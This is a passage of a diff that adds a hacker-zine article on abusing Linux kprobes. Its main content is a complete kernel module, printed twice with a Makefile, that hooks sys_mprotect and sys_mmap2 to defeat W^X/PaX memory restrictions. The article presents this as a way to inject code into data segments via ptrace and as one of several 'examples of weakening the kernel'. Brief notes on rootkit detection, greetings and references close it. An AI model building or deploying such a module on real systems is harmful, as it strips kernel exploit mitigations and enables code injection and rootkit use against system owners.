+    __asm__ ("movl $val, %eax\n"
+	     "push $ret_addr\n"
+	     "ret");
+
+Since I did not provide an implementation for a more flexible
+kretprobe, the reader may be interested in doing so. Once I
+get an opportunity I intend on writing an LKM patch for one
+and releasing it.
+
+
+---[ 3 - Patch to unpatch W^X (mprotect/mmap restrictions)
+
+Lets move on to a couple of other patches using the existing
+kprobe features to show some usefulness other than a file hiding
+mechanism. These two patches will aim at disabling the W^X feature
+that is enabled in kernels -- PaX for instance calls this mprotect
+restrictions. W^X is to say that an mmap segment cannot be created
+or modified to be both write+execute. The patches below give us
+two benefits:
+
+1. On systems with the NX (no_exec_pages) bit set, we will be able
+to do things like mark the data segment as executable and inject
+code there for execution using ptrace.
+
+2. Many ELF protectors (Burneye, Shiva, Elfcrypt, etc.) store the
+encrypted executable in the text segment of the stub/loading code
+and to decrypt part of a programs own text, would be considered self
+modifying code -- W^X prevents this -- so with our Anti-W^X patch
+we can use our ELF Protectors, and make segments such as the stack
+and data segment, once again, executable on systems with the NX bit set
+where mprotect/mmap restrictions really make a difference.
+
+An important note is that due to the design nature of the following
+patch, we cannot change the return values; so mprotect and mmap
+will both give a return value that says they failed-- don't exit
+based on error checking because your write+execute mmap and mprotect
+attempts actually succeed. To test you can look at /proc/pid/maps
+of the given process.			
+
+-- tested on 2.6.18 -- 
+
+On modern systems simply change regs->eax to regs->ax in the two necessary spots.
+Also exporting the module license to GPL is not necessary to use kprobes on modern
+systems.
+
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/kprobes.h>
+#include <linux/mm.h>
+#include <linux/fs.h>
+#include <linux/file.h>
+
+
+#define PROT_READ       0x1             /* Page can be read.  */
+#define PROT_WRITE      0x2             /* Page can be written.  */
+#define PROT_EXEC       0x4             /* Page can be executed.  */
+#define PROT_NONE       0x0             /* Page can not be accessed.  */
+#define MAP_FIXED       0x10   		
+
+#define MAP_ANONYMOUS   0x20            /* don't use a file */
+#define MAP_GROWSDOWN   0x0100          /* stack-like segment */
+#define MAP_DENYWRITE   0x0800          /* ETXTBSY */
+#define MAP_EXECUTABLE  0x1000          /* mark it as an executable */
+
+/* 
+ * It is preferable to write a script that gets
+ * kallsyms_lookup_name() from System.map and then
+ * passes it as a module parameter, but in this example
+ * we just look it up and assign it our selves, so
+ * make sure to change the address.
+ */
+unsigned long (*_kallsyms_lookup_name)(char *) = (void *)0xc043e5d0; // change this
+
+unsigned long (*_get_unmapped_area)(struct file *file, unsigned long addr, unsigned long len,
+                unsigned long pgoff, unsigned long flags);
+
+	
+static struct 
+{
+	int assign_wx;
+	unsigned long start;
+	size_t len;
+	long prot;
+} mprotect;
+
+MODULE_LICENSE("GPL");
+
+asmlinkage int kp_sys_mprotect(unsigned long start, size_t len, long prot)
+{
+        struct vm_area_struct *vma = current->mm->mmap;
+		
+	mprotect.assign_wx = 0;
+	mprotect.start = start;
+	mprotect.prot = prot;
+
+	/* This doesn't concern us */
+        if (!(prot & PROT_EXEC) && !(prot & PROT_WRITE))
+                goto out;
+
+        down_write(&current->mm->mmap_sem);
+        
+	/* Get vma for start memory area */
+        vma = find_vma(current->mm, start);
+	if (!vma)
+		goto free_sem;
+
+        if (prot & (PROT_WRITE|PROT_EXEC))
+	{
+		mprotect.assign_wx++;
+		goto free_sem;
+	}
+
+	if (prot & PROT_WRITE)
+        {
+	        mprotect.assign_wx++;
+        	goto free_sem;
+	}
+	
+        if (prot & PROT_EXEC)
+	{
+		mprotect.assign_wx++;
+		goto free_sem;
+	}
+	
+	free_sem:
+	up_write(&current->mm->mmap_sem);
+	
+	out:
+	jprobe_return();
+	return 0;
+}
+
+/*
+ before the following function is executed, a W^X patch such as PaX
+ mprotect/mmap restrictions, will have code such as:
+ if ((vm_flags & (VM_WRITE | VM_EXEC)) != VM_EXEC)
+                       vm_flags &= ~(VM_EXEC | VM_MAYEXEC);
+               else
+                       vm_flags &= ~(VM_WRITE | VM_MAYWRITE);
+ 
+ But our return probe gets the last say in the matter. mprotect
+ will return like it failed (With a positive value) but the VMA's
+ or memory maps will be both write+execute, just make sure that
+ you don't error checking then exit if mprotect or mmap fail 
+ because they will return failed values.
+*/
+
+static int rp_mprotect(struct kretprobe_instance *ri, struct pt_regs *regs)
+{
+	struct vm_area_struct *vma;
+
+	if (!mprotect.assign_wx)
+		goto out;
+	
+	down_write(&current->mm->mmap_sem);
+
+        /* Get vma for start memory area */
+        vma = find_vma(current->mm, mprotect.start);
+        if (!vma)
+                goto sem_out;
+
+	if (mprotect.prot & PROT_EXEC)
+	{
+		vma->vm_flags |= VM_MAYEXEC;
+		vma->vm_flags |= VM_EXEC;
+	}
+	
+	if (mprotect.prot & PROT_WRITE)
+	{
+		vma->vm_flags |= VM_MAYWRITE;
+		vma->vm_flags |= VM_WRITE;
+	}
+	
+	sem_out:
+	up_write(&current->mm->mmap_sem);
+		
+
+	out:
+	return 0;
+}
+
+struct 
+{
+        unsigned long addr;
+#define MMAP_CLEAN 0
+#define MMAP_DIRTY 1
+        int mmap_prot_state;
+        unsigned int len;
+} do_mmap_data;
+
+/* Return probe code for sys_mmap2 */
+static int rp_mmap(struct kretprobe_instance *ri, struct pt_regs *regs)
+{
+        struct vm_area_struct *vma = current->mm->mmap;
+        
+        /* we are assuming the default function to get an unmapped region is arch_get_unmapped_topdown() */
+        if (do_mmap_data.addr - regs->eax == do_mmap_data.len)
+                do_mmap_data.addr = regs->eax;
+        else
+		goto out; // pretty unlikely
+
+        switch(do_mmap_data.mmap_prot_state)
+        {
+                case MMAP_CLEAN:
+                        break;
+                case MMAP_DIRTY: // lets undo the work of the W^X patch :)
+                        down_write(&current->mm->mmap_sem);
+                        vma = find_vma(current->mm, do_mmap_data.addr);
+                        if (!vma)
+                                break;
+			printk("Found vma's and setting all writes and exec possibilities\n");
+                        vma->vm_flags |= (VM_EXEC | VM_MAYEXEC);
+                        vma->vm_flags |= (VM_WRITE | VM_MAYWRITE);
+                        up_write(&current->mm->mmap_sem);
+                        break;
+        }
+	out:
+	return 0;
+}
+
+asmlinkage long kp_sys_mmap2(unsigned long addr, unsigned long len, unsigned long prot, unsigned long flags,
+                          unsigned long fd, unsigned long pgoff)
+{
+
+        struct file *file = NULL;
+	
+	printk("In sys_mmap2\n");
+        do_mmap_data.len = len;
+
+        /* We emulate a combination of sys_mmap2 and do_mmap_pgoff */
+        
+	/* This is the easiest scenario */
+	/* because we know the mmap addr */
+        if (flags & MAP_FIXED)
+        {
+		printk("MAP_FIXED\n");
+                do_mmap_data.addr = addr;
+                if ((prot & PROT_EXEC) && (prot & PROT_WRITE))
+                        do_mmap_data.mmap_prot_state = MMAP_DIRTY;
+                else
+                        do_mmap_data.mmap_prot_state = MMAP_CLEAN;
+                goto out;
+        }
+
+        flags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);
+        if (!(flags & MAP_ANONYMOUS)) 
+        {
+                file = fget(fd);
+                if (!file)
+                        goto out;
+        }
+        
+        /* mimick do_mmap_pgoff to get the linear range */
+        down_write(&current->mm->mmap_sem);
+
+        if (file) 
+        {
+                if (!file->f_op || !file->f_op->mmap)
+                        goto sem_out;
+        }
+
+        if (!len)
+                goto sem_out;
+
+        len = PAGE_ALIGN(len);
+        if (!len || len > TASK_SIZE)
+                goto sem_out;
+
+        if ((pgoff + (len >> PAGE_SHIFT)) < pgoff)
+                goto sem_out;
+
+        /* when the real sys_mmap2/do_mmap_pgoff are called 
+         * they will get the next linear range 
+	 * which will be at do_mmap_data.addr - do_mmap_data.len 
+         * This relies on get_unmapped_area() calling arch_get_unmapped_area_topdown() 
+	 */
+	printk("get_unmapped_area call\n");
+        addr = _get_unmapped_area(file, addr, len, 0, flags);
+        printk("addr: 0x%lx\n", addr);
+	do_mmap_data.addr = addr;
+
+        if ((prot & PROT_EXEC) && (prot & PROT_WRITE))
+                do_mmap_data.mmap_prot_state = MMAP_DIRTY;
+	else
+               	do_mmap_data.mmap_prot_state = MMAP_CLEAN;
+                
+        sem_out:
+        up_write(&current->mm->mmap_sem);
+        out:
+        jprobe_return();
+        return 0;
+
+}
+
+static struct jprobe sys_mmap2_jprobe = 
+{
+        .entry = (kprobe_opcode_t *)kp_sys_mmap2
+};
+
+static struct jprobe sys_mprotect_jprobe =
+{
+	.entry = (kprobe_opcode_t *)kp_sys_mprotect
+};
+
+static struct kretprobe mprotect_kretprobe = 
+{
+        .handler  = rp_mprotect,
+	.maxactive = 1 // this code isn't really SMP reliable
+};
+
+static struct kretprobe mmap_kretprobe =
+{
+        .handler = rp_mmap,
+        .maxactive = 1 // this code isn't really SMP reliable
+};
+
+
+void exit_module(void)
+{
+	unregister_jprobe(&sys_mmap2_jprobe);
+        unregister_jprobe(&sys_mprotect_jprobe);
+
+        unregister_kretprobe(&mprotect_kretprobe);
+        unregister_kretprobe(&mmap_kretprobe);
+}
+
+int init_module(void)
+{
+	int j = 0, k = 0;
+
+	_get_unmapped_area = (void *)_kallsyms_lookup_name("arch_get_unmapped_area_topdown");
+	
+	sys_mmap2_jprobe.kp.addr = (void *)_kallsyms_lookup_name("sys_mmap2");
+	/* Register our jprobes */
+	if (register_jprobe(&sys_mmap2_jprobe) < 0)
+		goto jfail;
+	j++;
+
+	sys_mprotect_jprobe.kp.addr = (void *)_kallsyms_lookup_name("sys_mprotect");
+	if (register_jprobe(&sys_mprotect_jprobe) < 0)
+		goto jfail;
+	
+	mprotect_kretprobe.kp.addr = (void *)_kallsyms_lookup_name("sys_mprotect");
+	/* Register our kretprobes */
+	if (register_kretprobe(&mprotect_kretprobe) < 0)
+		goto kfail;
+	k++;
+	
+	mmap_kretprobe.kp.addr = (void *)_kallsyms_lookup_name("sys_mmap2");
+	if (register_kretprobe(&mmap_kretprobe) < 0)
+		goto kfail;
+	
+	return 0;
+
+	jfail:
+		
+		printk(KERN_EMERG "register_jprobe failed for %s\n", (!j ? "sys_mmap2" : "sys_mprotect"));
+	kfail:
+		printk(KERN_EMERG "register_kretprobe failed for %s\n", (!k ? "mprotect" : "mmap"));
+
+	return -1;
+}
+
+	
+module_exit(exit_module);
+
+--- end of code ---
+
+
+---[ 4 - Notes on rootkit detection for kprobes
+
+If a kernel rootkit is designed soley using kprobes and properly hides
+itself from the kprobe entries in sysfs, then a rootkit detection program
+can still easily detect what kernel functions have been hooked. I will
+leave this obvious solution to anyone interested in adding this feature
+to their detectors but the answer lies in this paper as well as the kprobe
+documentation.
+
+
+---[ 5 - Summing it all up
+
+We have seen that the kprobe interface, which is primarily implemented
+for kernel debugging can be used to instrument the kernel in some
+interesting ways. We have explored kprobes strengths, weaknesses, and provided
+several examples of weakening the kernel by patching it using jprobe and
+kretprobe techniques. We also went over some ideas for implementing a more
+hacker friendly kretprobe implementation (Although we did not provide one).
+
+It is also important to mention to people who are engineering security code
+that kprobes can also be used to debug kernel code, as well as install simple
+patches for hardening the kernel. But phrack isn't about that, so patches
+to harden the kernel were not included -- just know that it is possible.
+
+
+---[ 6 - Greetz
+
+kad - thanks for encouraging me to write this, and being cool guy with
+priceless skills and good advice.
+
+Silvio - My initial inspiration for kernel and ELF hacking all started with you.
+You've been a good friend and mentor, many many thanks.
+
+chrak - My long time friend and occasional coding partner. 13yrs ago this guy
+helped me write my first backdoor program for Linux.
+
+nynex - I owe you for hosting my stuff and being a good friend.
+
+mayhem - For writing some really cool ELF code and being an inspiration.
+
+grugq - Your original AF work has been an inspiration as well.
+
+halfdead - For knowing everything about the universe and our realm *literally*
+
+jimjones (UNIX Terrorist) - you will be getting a copy of this soon, word.
+
+All of the digitalnerds -- especially halfdead, scrippie, pronsa and abh.
+
+#bitlackeys on EFnet, a small and strange little channel with people whom
+I've been friends with for years.
+
+#formal on a secret network with extremely smart people and good conversation.
+
+RuxCon folk are pretty much all awesome too, thanks.
+
+
+---[ 7 - References
+
+Please note that I did not use any references other than code and official
+documentation for this paper, but the following papers are quite relevant and
+since I have read them (along with many other great papers) they all play a
+role in my collective knowledge of kernel malware and rootkit exploration.
+
+[1] kad - Handling interrupt descriptor table for fun and profit
+          http://www.phrack.org/issues.html?issue=59&id=4#article
+
+[2] Halfdead - Mystifying the debugger for ultimate stealthness 
+               http://www.phrack.org/issues.html?issue=65&id=8#article 
+
+[3] Silvio - Kernel function hijacking (Function trampolines)
+             http://vxheavens.com/lib/vsc08.html 
+
+
+---[ 8 - Code
+
+/*
+	Tested on 2.6.18 kernel, on modern kernels change regs->eax to regs->ax.	
+	From the ElfMaster, 2010.
+
+Makefile:
+
+obj-m += w_plus_x.o
+
+MODULES = w_plus_x.ko
+
+all: clean $(MODULES)
+
+$(MODULES):
+        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+
+clean:
+        rm -f *.o *.ko Module.markers Module.symvers w_plus_x*.mod.c modules.order
+
+
+*/
+
+
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/kprobes.h>
+#include <linux/mm.h>
+#include <linux/fs.h>
+#include <linux/file.h>
+
+
+#define PROT_READ       0x1             /* Page can be read.  */
+#define PROT_WRITE      0x2             /* Page can be written.  */
+#define PROT_EXEC       0x4             /* Page can be executed.  */
+#define PROT_NONE       0x0             /* Page can not be accessed.  */
+#define MAP_FIXED       0x10   		
+
+#define MAP_ANONYMOUS   0x20            /* don't use a file */
+#define MAP_GROWSDOWN   0x0100          /* stack-like segment */
+#define MAP_DENYWRITE   0x0800          /* ETXTBSY */
+#define MAP_EXECUTABLE  0x1000          /* mark it as an executable */
+
+/* 
+ * It is preferable to write a script that gets
+ * kallsyms_lookup_name() from System.map and then
+ * passes it as a module parameter, but in this example
+ * we just look it up and assign it our selves, so
+ * make sure to change the address.
+ */
+unsigned long (*_kallsyms_lookup_name)(char *) = (void *)0xc043e5d0; // change this
+
+unsigned long (*_get_unmapped_area)(struct file *file, unsigned long addr, unsigned long len,
+                unsigned long pgoff, unsigned long flags);
+
+	
+static struct 
+{
+	int assign_wx;
+	unsigned long start;
+	size_t len;
+	long prot;
+} mprotect;
+
+MODULE_LICENSE("GPL");
+
+asmlinkage int kp_sys_mprotect(unsigned long start, size_t len, long prot)
+{
+        struct vm_area_struct *vma = current->mm->mmap;
+		
+	mprotect.assign_wx = 0;
+	mprotect.start = start;
+	mprotect.prot = prot;
+
+	/* This doesn't concern us */
+        if (!(prot & PROT_EXEC) && !(prot & PROT_WRITE))
+                goto out;
+
+        down_write(&current->mm->mmap_sem);
+        
+	/* Get vma for start memory area */
+        vma = find_vma(current->mm, start);
+	if (!vma)
+		goto free_sem;
+
+        if (prot & (PROT_WRITE|PROT_EXEC))
+	{
+		mprotect.assign_wx++;
+		goto free_sem;
+	}
+
+	if (prot & PROT_WRITE)
+        {
+	        mprotect.assign_wx++;
+        	goto free_sem;
+	}
+	
+        if (prot & PROT_EXEC)
+	{
+		mprotect.assign_wx++;
+		goto free_sem;
+	}
+	
+	free_sem:
+	up_write(&current->mm->mmap_sem);
+	
+	out:
+	jprobe_return();
+	return 0;
+}
+
+/*
+ before the following function is executed, a W^X patch such as PaX
+ mprotect/mmap restrictions, will have code such as:
+ if ((vm_flags & (VM_WRITE | VM_EXEC)) != VM_EXEC)
+                       vm_flags &= ~(VM_EXEC | VM_MAYEXEC);
+               else
+                       vm_flags &= ~(VM_WRITE | VM_MAYWRITE);
+ 
+ But our return probe gets the last say in the matter. mprotect
+ will return like it failed (With a positive value) but the VMA's
+ or memory maps will be both write+execute, just make sure that
+ you don't error checking then exit if mprotect or mmap fail 
+ because they will return failed values.
+*/
+
+static int rp_mprotect(struct kretprobe_instance *ri, struct pt_regs *regs)
+{
+	struct vm_area_struct *vma;
+
+	if (!mprotect.assign_wx)
+		goto out;
+	
+	down_write(&current->mm->mmap_sem);
+
+        /* Get vma for start memory area */
+        vma = find_vma(current->mm, mprotect.start);
+        if (!vma)
+                goto sem_out;
+
+	if (mprotect.prot & PROT_EXEC)
+	{
+		vma->vm_flags |= VM_MAYEXEC;
+		vma->vm_flags |= VM_EXEC;
+	}
+	
+	if (mprotect.prot & PROT_WRITE)
+	{
+		vma->vm_flags |= VM_MAYWRITE;
+		vma->vm_flags |= VM_WRITE;
+	}
+	
+	sem_out:
+	up_write(&current->mm->mmap_sem);
+		
+
+	out:
+	return 0;
+}
+
+struct 
+{
+        unsigned long addr;
+#define MMAP_CLEAN 0
+#define MMAP_DIRTY 1
+        int mmap_prot_state;
+        unsigned int len;
+} do_mmap_data;
+
+/* Return probe code for sys_mmap2 */
+static int rp_mmap(struct kretprobe_instance *ri, struct pt_regs *regs)
+{
+        struct vm_area_struct *vma = current->mm->mmap;
+        
+        /* we are assuming the default function to get an unmapped region is arch_get_unmapped_topdown() */
+        if (do_mmap_data.addr - regs->eax == do_mmap_data.len)
+                do_mmap_data.addr = regs->eax;
+        else
+		goto out; // pretty unlikely
+
+        switch(do_mmap_data.mmap_prot_state)
+        {
+                case MMAP_CLEAN:
+                        break;
+                case MMAP_DIRTY: // lets undo the work of the W^X patch :)
+                        down_write(&current->mm->mmap_sem);
+                        vma = find_vma(current->mm, do_mmap_data.addr);
+                        if (!vma)
+                                break;
+			printk("Found vma's and setting all writes and exec possibilities\n");
+                        vma->vm_flags |= (VM_EXEC | VM_MAYEXEC);
+                        vma->vm_flags |= (VM_WRITE | VM_MAYWRITE);
+                        up_write(&current->mm->mmap_sem);
+                        break;
+        }
+	out:
+	return 0;
+}
+
+asmlinkage long kp_sys_mmap2(unsigned long addr, unsigned long len, unsigned long prot, unsigned long flags,
+                          unsigned long fd, unsigned long pgoff)
+{
+
+        struct file *file = NULL;
+	
+	printk("In sys_mmap2\n");
+        do_mmap_data.len = len;
+
+        /* We emulate a combination of sys_mmap2 and do_mmap_pgoff */
+        
+	/* This is the easiest scenario */
+	/* because we know the mmap addr */
+        if (flags & MAP_FIXED)
+        {
+		printk("MAP_FIXED\n");
+                do_mmap_data.addr = addr;
+                if ((prot & PROT_EXEC) && (prot & PROT_WRITE))
+                        do_mmap_data.mmap_prot_state = MMAP_DIRTY;
+                else
+                        do_mmap_data.mmap_prot_state = MMAP_CLEAN;
+                goto out;
+        }
+
+        flags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);
+        if (!(flags & MAP_ANONYMOUS)) 
+        {
+                file = fget(fd);
+                if (!file)
+                        goto out;
+        }
+        
+        /* mimick do_mmap_pgoff to get the linear range */
+        down_write(&current->mm->mmap_sem);
+
+        if (file) 
+        {
+                if (!file->f_op || !file->f_op->mmap)
+                        goto sem_out;
+        }
+
+        if (!len)
+                goto sem_out;
+
+        len = PAGE_ALIGN(len);
+        if (!len || len > TASK_SIZE)
+                goto sem_out;
+
+        if ((pgoff + (len >> PAGE_SHIFT)) < pgoff)
+                goto sem_out;
+
+        /* when the real sys_mmap2/do_mmap_pgoff are called 
+         * they will get the next linear range 
+	 * which will be at do_mmap_data.addr - do_mmap_data.len 
+         * This relies on get_unmapped_area() calling arch_get_unmapped_area_topdown() 
+	 */
+	printk("get_unmapped_area call\n");
+        addr = _get_unmapped_area(file, addr, len, 0, flags);
+        printk("addr: 0x%lx\n", addr);
+	do_mmap_data.addr = addr;
+
+        if ((prot & PROT_EXEC) && (prot & PROT_WRITE))
+                do_mmap_data.mmap_prot_state = MMAP_DIRTY;
+	else
+               	do_mmap_data.mmap_prot_state = MMAP_CLEAN;
+                
+        sem_out:
+        up_write(&current->mm->mmap_sem);
+        out:
+        jprobe_return();
+        return 0;
+
+}
+
+static struct jprobe sys_mmap2_jprobe = 
+{
+        .entry = (kprobe_opcode_t *)kp_sys_mmap2
+};
+
+static struct jprobe sys_mprotect_jprobe =
+{
+	.entry = (kprobe_opcode_t *)kp_sys_mprotect
+};
+
+static struct kretprobe mprotect_kretprobe = 
+{
+        .handler  = rp_mprotect,
+	.maxactive = 1 // this code isn't really SMP reliable
+};
+
+static struct kretprobe mmap_kretprobe =
+{
+        .handler = rp_mmap,
+        .maxactive = 1 // this code isn't really SMP reliable
+};
+
+
+void exit_module(void)
+{
+	unregister_jprobe(&sys_mmap2_jprobe);
+        unregister_jprobe(&sys_mprotect_jprobe);
+
+        unregister_kretprobe(&mprotect_kretprobe);
+        unregister_kretprobe(&mmap_kretprobe);
+}
+
+int init_module(void)
+{
+	int j = 0, k = 0;
+
+	_get_unmapped_area = (void *)_kallsyms_lookup_name("arch_get_unmapped_area_topdown");
+	
+	sys_mmap2_jprobe.kp.addr = (void *)_kallsyms_lookup_name("sys_mmap2");
+	/* Register our jprobes */
+	if (register_jprobe(&sys_mmap2_jprobe) < 0)
+		goto jfail;
+	j++;
+
+	sys_mprotect_jprobe.kp.addr = (void *)_kallsyms_lookup_name("sys_mprotect");
+	if (register_jprobe(&sys_mprotect_jprobe) < 0)
+		goto jfail;
+	
+	mprotect_kretprobe.kp.addr = (void *)_kallsyms_lookup_name("sys_mprotect");
+	/* Register our kretprobes */
+	if (register_kretprobe(&mprotect_kretprobe) < 0)
+		goto kfail;
+	k++;
+	
+	mmap_kretprobe.kp.addr = (void *)_kallsyms_lookup_name("sys_mmap2");
+	if (register_kretprobe(&mmap_kretprobe) < 0)
+		goto kfail;
+	
+	return 0;
+
+	jfail:
+		
+		printk(KERN_EMERG "register_jprobe failed for %s\n", (!j ? "sys_mmap2" : "sys_mprotect"));
+	kfail:
+		printk(KERN_EMERG "register_kretprobe failed for %s\n", (!k ? "mprotect" : "mmap"));
+
+	return -1;
+}
+
+	
+module_exit(exit_module);
+
+----EOF----
